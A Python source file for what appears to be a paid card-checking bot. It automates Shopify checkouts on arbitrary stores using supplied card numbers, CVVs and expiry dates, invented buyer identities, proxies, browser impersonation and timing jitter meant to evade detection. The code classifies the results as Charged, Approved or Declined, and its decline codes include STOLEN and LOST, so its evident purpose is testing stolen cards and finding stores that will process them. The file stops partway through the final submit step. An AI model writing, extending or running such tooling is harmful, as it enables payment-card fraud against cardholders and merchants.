import asyncio
import json
import re
import random
from urllib.parse import urlparse
from quart import Quart, request, jsonify
import os
import time
from curl_cffi.requests import AsyncSession
from queries import (
    QUERY_PROPOSAL_SHIPPING,
    QUERY_PROPOSAL_DELIVERY,
    MUTATION_SUBMIT,
    QUERY_POLL,
)

MIN_PRODUCT_PRICE = 1.0
DEFAULT_GATEWAY = "Shopify Payments"

C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US":      {"address1": "123 Main",              "city": "NY",       "postalCode": "10080",   "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
    "CA":      {"address1": "88 Queen",              "city": "Toronto",  "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB":      {"address1": "221B Baker Street",     "city": "London",   "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN":      {"address1": "221B MG",               "city": "Mumbai",   "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "+91 9876543210"},
    "AE":      {"address1": "Burj Tower",            "city": "Dubai",    "postalCode": "",        "zoneCode": "DU",  "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK":      {"address1": "Nathan 88",             "city": "Kowloon",  "postalCode": "",        "zoneCode": "KL",  "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN":      {"address1": "8 Zhongguancun Street", "city": "Beijing",  "postalCode": "100080",  "zoneCode": "BJ",  "countryCode": "CN", "phone": "1062512345"},
    "CH":      {"address1": "Gotthardstrasse 17",    "city": "Schweiz",  "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU":      {"address1": "1 Martin Place",        "city": "Sydney",   "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main",              "city": "New York", "postalCode": "10080",   "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
}

# SITE-LEVEL ERRORS: These indicate the site cannot process checkouts, not card issues
SITE_ERRORS = frozenset({
    "CAPTCHA_REQUIRED", "NO_PRODUCT_IN_PRICE_RANGE", "ZERO_DOLLAR_ORDER",
    "SITE_ERROR", "TIMEOUT", "CONNECTION_FAILED", "SSL_ERROR",
    "HTTP_ERROR", "CLOUDFLARE", "EMPTY_RESPONSE", "INVALID_URL",
})


def map_response(success: bool, raw_response: str) -> tuple[bool, str]:
    """
    Map raw checkout result to simplified Status/Response.

    CRITICAL SITE TESTING LOGIC:
    - A site is WORKING if it processes checkout to payment processor (even if declined)
    - Returns (True, status) for: Charged, Approved, Declined, Insufficient Funds
    - Returns (False, error) ONLY for site-level failures that prevent checkout

    Args:
        success: Whether API call succeeded
        raw_response: Response message from checkout

    Returns:
        (is_working, status_message) tuple
    """
    raw_upper = (raw_response or "").upper().strip()

    # Charged = site is working
    if raw_upper == "ORDER_PLACED" or "CHARGED" in raw_upper:
        return True, "Charged"

    # Check for site-level errors (these mean site is DEAD)
    for site_error in SITE_ERRORS:
        if site_error in raw_upper:
            return False, raw_response or "Site Error"

    # If API call failed but not a site error, assume site issue
    if not success:
        return False, raw_response or "Dead"

    # ALL OTHER RESPONSES = site is working (including all card declines)
    # Card declines (CARD_DECLINED, INSUFFICIENT_FUNDS, etc.) prove site works
    if any(x in raw_upper for x in ["DECLINED", "INSUFFICIENT", "EXPIRED", "INVALID",
                                      "STOLEN", "LOST", "RESTRICTED", "BLOCKED",
                                      "NOT_PERMITTED", "FRAUD", "3DS", "OTP"]):
        return True, "Declined"

    # Default: if we got here, site processed the request
    return True, "Approved"


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split(".")[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]


def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None


class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"


def parse_proxy_for_curl(proxy_str):
    """Return curl_cffi-compatible proxies dict. Supports http and socks5."""
    if not proxy_str:
        return {}
    if "://" in proxy_str:
        return {"http": proxy_str, "https": proxy_str}
    parts = proxy_str.split(":")
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        url = f"http://{user}:{password}@{ip}:{port}"
    else:
        return {}
    return {"http": url, "https": url}


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = [
        "CAPTCHA_REQUIRED",
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        "captcha required",
        "CAPTCHA CHALLENGE",
        "hcaptcha",
        "h-captcha",
    ]
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False


async def make_graphql_request(session, graphql_url, params, headers, json_data, max_retries=1):
    """Send a GraphQL POST and return (response, text) tuple."""
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            return response, response.text
        except Exception as e:
            if attempt == max_retries:
                return None, str(e)
            await asyncio.sleep(1)
    return None, "Request failed"


async def fetch_products(domain, proxy_str=None, max_price=None):
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain

        proxies = parse_proxy_for_curl(proxy_str)

        async with AsyncSession(impersonate="chrome120", verify=False) as session:
            resp = await session.get(
                f"{domain}/products.json",
                proxies=proxies if proxies else None,
                timeout=10,
            )
            if resp.status_code != 200:
                return False, f"<b>Site Error! Status: {resp.status_code}</b>"
            text = resp.text
            if "shopify" not in text.lower():
                return False, "<b>Not Shopify!</b>"
            result = json.loads(text).get("products", [])
            if not result:
                return False, "<b>No Products!</b>"

        min_price = float("inf")
        min_product = None
        preferred_product = None

        for product in result:
            if not product.get("variants"):
                continue
            for variant in product["variants"]:
                if not variant.get("available", True):
                    continue
                try:
                    price = variant.get("price", "0")
                    if isinstance(price, str):
                        price = float(price.replace(",", ""))
                    else:
                        price = float(price)
                    # Respect price ceiling when set by the bot's active filter
                    if max_price is not None and price > max_price:
                        continue
                    if price < min_price:
                        min_price = price
                        min_product = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product['handle']}",
                        }
                    if preferred_product is None and price >= MIN_PRODUCT_PRICE:
                        preferred_product = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError, AttributeError):
                    continue

        final_product = preferred_product if preferred_product else min_product
        if isinstance(final_product, dict) and final_product.get("variant_id"):
            return final_product
        # If max_price filter was applied, return a specific code so the bot can
        # refund the credit and skip — otherwise fall through to generic error.
        if max_price is not None:
            return False, "NO_PRODUCT_IN_PRICE_RANGE"
        return False, "<b>No Valid Products</b>"

    except Exception as e:
        return False, f"error: {str(e)}"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    PRESERVE_EXACT = ["3DS_REQUIRED", "ORDER_PLACED", "OTP_REQUIRED", "INSUFFICIENT_FUNDS"]
    msg_upper = message.upper()
    for sentinel in PRESERVE_EXACT:
        if re.search(r"(?<![A-Z0-9_])" + re.escape(sentinel) + r"(?![A-Z0-9_])", msg_upper):
            return sentinel
    patterns = [
        r"(PAYMENTS_[A-Z_]+)",
        r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z_]+)",
        r"([A-Z]+_[A-Z_]+)",
        r'code["\'\\]?\\s*[:=]\\s*["\'\\]?([^"\',]+)["\'\\]?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'",
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    return message[:50]


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, max_price=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    # product_price is set once after fetch_products and never overwritten by checkout
    # totals — it is used as the stable fallback in all error returns.
    product_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    displayName = ""
    payment_identifier = None
    proxies = parse_proxy_for_curl(proxy_str)
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]

        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)

        phone    = address_info["phone"]
        street   = address_info["address1"]
        city     = address_info["city"]
        state    = address_info["zoneCode"]
        s_zip    = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str, max_price=max_price)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, product_price, currency
            variant_id = info["variant_id"]
            # Store product price immediately; product_price is never overwritten by
            # checkout totals so it serves as the stable fallback for all error paths.
            product_price = info.get("price", "0.00")
            total_price = product_price

        async with AsyncSession(impersonate="chrome120", verify=False) as session:
            url      = ourl
            cart     = url + "/cart/add.js"
            checkout = url + "/checkout/"

            cart_headers = {
                **headers,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/javascript",
            }
            cart_resp = await session.post(
                cart,
                data=f"id={variant_id}&quantity=1",
                headers=cart_headers,
                proxies=proxies if proxies else None,
            )

            if cart_resp.status_code != 200:
                cart_headers_alt = {
                    **headers,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                }
                cart_data = {"items": [{"id": int(variant_id), "quantity": 1}]}
                cart_resp = await session.post(
                    cart,
                    json=cart_data,
                    headers=cart_headers_alt,
                    proxies=proxies if proxies else None,
                )

            if cart_resp.status_code != 200:
                return False, f"Cart failed with status {cart_resp.status_code}", gateway, product_price if product_price != "0.00" else total_price, currency

            await asyncio.sleep(random.uniform(0.5, 2.0))

            checkout_headers = {
                **headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
            }
            response = await session.post(
                url=checkout,
                allow_redirects=True,
                headers=checkout_headers,
                proxies=proxies if proxies else None,
            )
            checkout_url = str(response.url)

            attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = (
                attempt_token_match.group(1)
                if attempt_token_match
                else checkout_url.split("/")[-1].split("?")[0]
            )

            sst = (
                response.headers.get("X-Checkout-One-Session-Token")
                or response.headers.get("x-checkout-one-session-token")
            )

            text = response.text
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
            if not sst:
                sst = extract_between(text, '"serializedSessionToken":"', '"')
            if not sst:
                sst = extract_between(text, 'data-session-token="', '"')
            if not sst:
                sst = extract_between(text, '"sessionToken":"', '"')

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, product_price if product_price != "0.00" else total_price, currency

            queueToken = extract_between(text, "queueToken&quot;:&quot;", "&quot;") or extract_between(text, '"queueToken":"', '"')
            stableId   = extract_between(text, "stableId&quot;:&quot;",   "&quot;") or extract_between(text, '"stableId":"',   '"')

            merch = (
                extract_between(text, "ProductVariantMerchandise/", "&quot;")
                or extract_between(text, "ProductVariantMerchandise/", "&q")
                or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            )
            if not merch:
                merch = str(variant_id)

            currency = "USD"
            if "currencyCode&quot;:&quot;" in text:
                currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            subtotal = (
                extract_between(
                    text,
                    'subtotalBeforeTaxesAndShipping&quot;:{"value":{"amount":"',
                    '"',
                )
                or extract_between(
                    text,
                    "subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;",
                    "&quot;",
                )
                or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            unescaped_text = text.replace("&quot;", '"').replace("&amp;", "&").replace("&#39;", "'")

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)

            if not sst:
                return False, "Failed to get session token", gateway, product_price if product_price != "0.00" else total_price, currency

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"]         = build_id
                headers["x-checkout-web-deploy-stage"]     = "production"
                headers["x-checkout-web-server-handling"]  = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            params_gql = {"operationName": "Proposal"}

            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": "ENG", "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"

            await asyncio.sleep(random.uniform(0.5, 2.0))

            for i in range(2):
                response, resp_text = await make_graphql_request(
                    session, graphql_url, params_gql, headers, json_data, max_retries=1
                )
                if i == 0:
                    await asyncio.sleep(3)

            if not response:
                return False, f"Request failed: {resp_text}", gateway, product_price if product_price != "0.00" else total_price, currency

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, product_price if product_price != "0.00" else total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency

            if "errors" in resp_json:
                errors = resp_json.get("errors", [])
                error_msgs = [e.get("message", str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, product_price if product_price != "0.00" else total_price, currency

            try:
                if "data" not in resp_json:
                    return False, "No data in proposal response", gateway, product_price if product_price != "0.00" else total_price, currency

                session_data = resp_json["data"].get("session")
                if session_data is None:
                    return False, "Session is null", gateway, product_price if product_price != "0.00" else total_price, currency

                negotiate = session_data.get("negotiate")
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, product_price if product_price != "0.00" else total_price, currency

                result = negotiate.get("result")
                if result is None:
                    return False, "Result is null", gateway, product_price if product_price != "0.00" else total_price, currency

                result_type = result.get("__typename", "Unknown")

                if result_type == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, product_price if product_price != "0.00" else total_price, currency
                if result_type == "Throttled":
                    return False, "Throttled", gateway, product_price if product_price != "0.00" else total_price, currency
                if result_type == "NegotiationResultFailed":
                    return False, "Negotiation failed", gateway, product_price if product_price != "0.00" else total_price, currency

                checkpoint_data = result.get("checkpointData")

                seller_proposal = result.get("sellerProposal")
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, product_price if product_price != "0.00" else total_price, currency

                delivery_data      = seller_proposal.get("delivery")
                running_total_data = seller_proposal.get("runningTotal")

                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, product_price if product_price != "0.00" else total_price, currency

                running_total = running_total_data["value"]["amount"]

            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, product_price if product_price != "0.00" else total_price, currency

            delivery_type = delivery_data.get("__typename", "")

            if delivery_type == "PendingTerms":
                delivery_strategy = ""
                shipping_amount   = 0.0
            elif delivery_type == "FilledDeliveryTerms":
                delivery_lines = delivery_data.get("deliveryLines", [{}])
                if delivery_lines:
                    available_strategies = delivery_lines[0].get("availableDeliveryStrategies", [])
                    if available_strategies:
                        delivery_strategy = available_strategies[0].get("handle", "")
                        raw_amt = (
                            available_strategies[0]
                            .get("amount", {})
                            .get("value", {})
                            .get("amount", "0")
                        )
                        try:
                            shipping_amount = float(raw_amt)
                        except Exception:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ""
                        shipping_amount   = 0.0
                else:
                    delivery_strategy = ""
                    shipping_amount   = 0.0
            else:
                delivery_strategy = ""
                shipping_amount   = 0.0

            try:
                tax_data = seller_proposal.get("tax", {})
                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    tax_raw    = tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
                    tax_amount = float(tax_raw)
                else:
                    tax_amount = 0.0
            except Exception:
                tax_amount = 0.0

            payment_data = seller_proposal.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                payment_methods = payment_data.get("availablePaymentLines", [])
                CARD_PAYMENT_TYPENAMES = {
                    "DirectPaymentMethod",
                    "CreditCardPaymentMethod",
                    "DebitCardPaymentMethod",
                    "BraintreeDirectPaymentMethod",
                }
                for method in payment_methods:
                    pm = method.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier") and pm.get("__typename", "") in CARD_PAYMENT_TYPENAMES:
                        payment_identifier = pm["paymentMethodIdentifier"]
                        displayName = pm.get("extensibilityDisplayName") or pm.get("name", "Unknown")
                        gateway     = displayName or "UNKNOWN"
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break
                if not payment_identifier:
                    for method in payment_methods:
                        pm  = method.get("paymentMethod", {})
                        pid = pm.get("paymentMethodIdentifier")
                        if pid:
                            payment_identifier = pid
                            displayName = pm.get("extensibilityDisplayName") or pm.get("name", "Unknown")
                            gateway     = displayName or "UNKNOWN"
                            total_price = str(float(running_total) + shipping_amount + tax_amount)
                            break

            # Fallback: if checkout totals resolved to zero (e.g. running_total
            # was never extracted from the GraphQL response), use product_price so
            # True-path returns (CARD_DECLINED, ORDER_PLACED, etc.) never show 0.0.
            if float(total_price or "0") == 0.0 and product_price not in ("0.00", "0.0"):
                total_price = product_price

            if not payment_identifier:
                return False, "No valid payment method found", gateway, product_price if product_price != "0.00" else total_price, currency

            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy if delivery_strategy else "",
                    "customDeliveryRate": False,
                },
                "options": {},
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
                "lines": [{"stableId": stableId or "1"}]
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
                "value": {"amount": str(shipping_amount), "currencyCode": currency}
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": address2, "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": firstName, "lastName": lastName,
                    "zoneCode": state, "phone": phone,
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            await asyncio.sleep(random.uniform(0.5, 2.0))

            response, resp_text = await make_graphql_request(
                session, graphql_url, params_gql, headers, json_data, max_retries=1
            )

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, product_price if product_price != "0.00" else total_price, currency

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urlparse(url).netloc,
            }

            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
                "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-fetch-storage-access": "active",
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            response = await session.post(
                "https://checkout.pci.shopifyinc.com/sessions",
                json=payload,
                headers=vault_headers,
                proxies=proxies if proxies else None,
            )
            try:
                token_data = json.loads(response.text)
                token = token_data.get("id")
                if not token:
                    return False, "Unable to get payment token", gateway, product_price if product_price != "0.00" else total_price, currency
            except Exception as e:
                return False, f"Unable to get payment token: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency

            params_submit = {"operationName": "SubmitForCompletion"}

            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_strategy if delivery_strategy else "",
                                    "customDeliveryRate": False,
                                },
                                "options": {"phone": phone},
                            },
                            "targetMerchandiseLines": {
                                "lines": [{"stableId": stableId or "1"}]
                            },
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {
                                "value": {"amount": str(shipping_amount), "currencyCode": currency}
                            },
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {
                                "value": {"amount": subtotal, "currencyCode": currency}
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": street, "address2": address2,
                                            "city": city, "countryCode": country_code,
                                            "postalCode": s_zip, "firstName": firstName,
                                            "lastName": lastName, "zoneCode": state,
                                            "phone": phone,
                                        }
                                    },
                                    "cardSource": None,
                                }
                            },
                            "amount": {
                                "value": {"amount": running_total, "currencyCode": currency}
                            },
                            "dueAt": None,
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": street, "address2": address2,
                                "city": city, "countryCode": country_code,
                                "postalCode": s_zip, "firstName": firstName,
                                "lastName": lastName, "zoneCode": state,
                                "phone": phone,
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {
                            "value": {"amount": str(tax_amount), "currencyCode": currency}
                        },
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }

            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            submit_json_data = {
                "query": MUTATION_SUBMIT,
                "variables": submit_variables,
                "operationName": "SubmitForCompletion",
            }

            await asyncio.sleep(random.uniform(0.5, 2.0))

            response, text = await make_graphql_request(
                session, graphql_url, params_submit, headers, submit_json_data, max_retries=1
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, product_price if product_price != "0.00" else total_price, currency

            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, product_price if product_price != "0.00" else total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, product_price if product_price != "0.00" else total_price, currency

